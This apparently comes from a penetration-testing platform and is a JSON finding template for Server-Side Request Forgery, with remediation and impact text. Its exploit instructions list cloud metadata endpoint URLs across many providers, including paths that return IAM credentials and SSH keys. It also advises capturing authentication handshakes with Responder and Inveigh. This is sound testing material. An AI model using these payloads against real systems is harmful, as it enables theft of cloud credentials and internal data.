{"default_url":null,"content":{"state":0,"taskInstructions":null,"references":[],"isTaskInstructionsVisible":true,"isCommentMandatory":false,"fields":[],"masterFinding":{"id":17055128,"exploitInstructions":"If you are in the cloud, attempt to reach some of the metadata services: https://gist.github.com/jhaddix/78cece26c91c6263653f31ba453e273b (copied below)<br><br>## AWS<br># from http://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-metadata.html#instancedata-data-categories<br><br>http://169.254.169.254/latest/user-data<br>http://169.254.169.254/latest/user-data/iam/security-credentials/[ROLE NAME]<br>http://169.254.169.254/latest/meta-data/iam/security-credentials/[ROLE NAME]<br>http://169.254.169.254/latest/meta-data/ami-id<br>http://169.254.169.254/latest/meta-data/reservation-id<br>http://169.254.169.254/latest/meta-data/hostname<br>http://169.254.169.254/latest/meta-data/public-keys/0/openssh-key<br>http://169.254.169.254/latest/meta-data/public-keys/[ID]/openssh-key<br><br># AWS - Dirs <br><br>http://169.254.169.254/<br>http://169.254.169.254/latest/meta-data/<br>http://169.254.169.254/latest/meta-data/public-keys/<br><br>## Google Cloud<br>#  https://cloud.google.com/compute/docs/metadata<br>#  - Requires the header \"Metadata-Flavor: Google\" or \"X-Google-Metadata-Request: True\"<br><br>http://169.254.169.254/computeMetadata/v1/<br>http://metadata.google.internal/computeMetadata/v1/<br>http://metadata/computeMetadata/v1/<br>http://metadata.google.internal/computeMetadata/v1/instance/hostname<br>http://metadata.google.internal/computeMetadata/v1/instance/id<br>http://metadata.google.internal/computeMetadata/v1/project/project-id<br><br># Google allows recursive pulls <br>http://metadata.google.internal/computeMetadata/v1/instance/disks/?recursive=true<br><br>## Google<br>#  Beta does NOT require a header atm (thanks Mathias Karlsson @avlidienbrunn)<br><br>http://metadata.google.internal/computeMetadata/v1beta1/<br><br>## Digital Ocean<br># https://developers.digitalocean.com/documentation/metadata/<br><br>http://169.254.169.254/metadata/v1.json<br>http://169.254.169.254/metadata/v1/ <br>http://169.254.169.254/metadata/v1/id<br>http://169.254.169.254/metadata/v1/user-data<br>http://169.254.169.254/metadata/v1/hostname<br>http://169.254.169.254/metadata/v1/region<br>http://169.254.169.254/metadata/v1/interfaces/public/0/ipv6/address<br><br>## Packetcloud<br><br>https://metadata.packet.net/userdata<br><br>## Azure<br>#  Limited, maybe more exist?<br># https://azure.microsoft.com/en-us/blog/what-just-happened-to-my-vm-in-vm-metadata-service/<br>http://169.254.169.254/metadata/v1/maintenance<br><br>## Update Apr 2017, Azure has more support; requires the header \"Metadata: true\"<br># https://docs.microsoft.com/en-us/azure/virtual-machines/windows/instance-metadata-service<br>http://169.254.169.254/metadata/instance?api-version=2017-04-02<br>http://169.254.169.254/metadata/instance/network/interface/0/ipv4/ipAddress/0/publicIpAddress?api-version=2017-04-02&format=text<br><br>## OpenStack/RackSpace <br># (header required? unknown)<br>http://169.254.169.254/openstack<br><br>## HP Helion <br># (header required? unknown)<br>http://169.254.169.254/2009-04-04/meta-data/ <br><br>## Oracle Cloud<br>http://192.0.0.192/latest/<br>http://192.0.0.192/latest/user-data/<br>http://192.0.0.192/latest/meta-data/<br>http://192.0.0.192/latest/attributes/<br><br>## Alibaba<br>http://100.100.100.200/latest/meta-data/<br>http://100.100.100.200/latest/meta-data/instance-id<br>http://100.100.100.200/latest/meta-data/image-id","verificationInstructions":"<b>Verification Instructions</b><br><br>Identify parameters in the application that can be modified to force the backend servers to connect to a remote resource. Try capturing connection and DNS requests with Burp Collaborator. If outbound connectivity is allowed, attempt to connect to a pentest server to capture authentication handshakes (both SMB and HTTP).<br><br>Sample:<br><br>https://website/login?username=uid&amp;password=pwd&amp;server=209.118.108.216<br><br>External Service Interaction (DNS) on URL/Host header, follow these steps to verify if it's actually a finding:<br>Inject arbitrary addresses (Collaborator URL, internal IPs, invalid DNS names) to URL/Host header<br>If the response comes from the &quot;right&quot; application regardless, and the is no indication that the injection resulted in a HTTP request to the injected domain, the finding should be marked false<br><br><b>Reporting Requirements</b><br>Add an explanation what causes the connection<br>Show the initial page<br>Show request with modified parameters<br>Show captured traffic<br><b>Further Testing</b><br><br>Report the following vulnerabilities if applicable:<br>Insufficient egress filtering<br><br><b>Tools</b><br>Burp Collaborator<br>Responder<br>Inveigh<br>","remediationInstructions":"Ensure sensitive endpoint information stays server-side and is not modifiable by the client.<br>","name":"Server-Side Request Forgery","sourceId":"M:ed068937-a6df-e411-a2a9-001e4f12001c","severity":"High","businessImpact":"An attacker could potentially capture application server or endpoint credentials, or other sensitive information contained in the modified application request. ","description":"As part of the application workflow, the application established a connection to an external resource. It is possible to modify the endpoint for this resource and force the application server to attempt to access a different location.<br>"}}}